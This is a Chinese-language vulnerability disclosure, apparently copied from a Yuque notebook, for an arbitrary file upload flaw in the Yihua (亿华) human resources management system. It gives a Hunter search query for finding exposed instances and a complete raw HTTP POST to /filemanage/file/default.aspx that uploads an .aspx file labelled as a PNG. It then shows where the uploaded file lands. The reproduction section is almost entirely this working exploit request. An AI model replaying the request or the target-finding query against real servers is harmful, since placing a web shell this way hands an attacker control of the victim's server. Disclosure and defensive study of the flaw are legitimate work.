# 亿华人力资源管理系统filemanage存在任意文件上传漏洞

# 一、漏洞简介
亿华人力资源管理系统是一款全面的人力资源管理软件，旨在帮助企业实现员工档案管理规范化、薪资管理自动化、招聘管理流程化等目标。该系统涵盖了人力资源管理的各个方面，包括员工档案管理、薪资管理、招聘管理、培训管理、福利管理等。亿华人力资源管理系统filemanage存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 亿华人力资源管理系统

# 三、资产测绘
+ hunter`web.body="亿华人力资源管理系统"`
+ 特征

![1700719530357-795ccebb-a7d7-426f-ad2e-6292dafa922e.png](./img/WTXbO54ISXKjDEmu/1700719530357-795ccebb-a7d7-426f-ad2e-6292dafa922e-046567.png)

# 四、漏洞复现
```plain
POST /filemanage/file/default.aspx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13611309432955470360700636523
Content-Length: 1170
Connection: close
Cookie: ASP.NET_SessionId=2g3mplfduhthivdwifteza3q
Upgrade-Insecure-Requests: 1

-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwULLTEzNjk1NjQwNjYPZBYCAgMPZBYGAgEPDxYCHgRUZXh0BQ0vRmlsZXNVcGxvYWQvZGQCAw8PFgIeB1Zpc2libGVoZGQCBA8PFgIfAWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIQXV0b05hbWWy1sk+LR5PsSft3vRvaTFxMKfM4/Mdc2SRqdis5w3/ag==
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

5338F018
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="fileToUpload"; filename="2.aspx"
Content-Type: image/png

123
-----------------------------13611309432955470360700636523
Content-Disposition: form-data; name="UploadBtn"

上传文件
-----------------------------13611309432955470360700636523
```

![1700989027405-0de5f0a6-b55e-4722-a428-fa3c48b6f79a.png](./img/WTXbO54ISXKjDEmu/1700989027405-0de5f0a6-b55e-4722-a428-fa3c48b6f79a-603997.png)

上传文件位置

```plain
/FilesUpload/2.aspx
```

![1700989045882-fc17b807-e1fb-4552-9726-160375aba6ac.png](./img/WTXbO54ISXKjDEmu/1700989045882-fc17b807-e1fb-4552-9726-160375aba6ac-901354.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/elmyeuhlruvlkvox>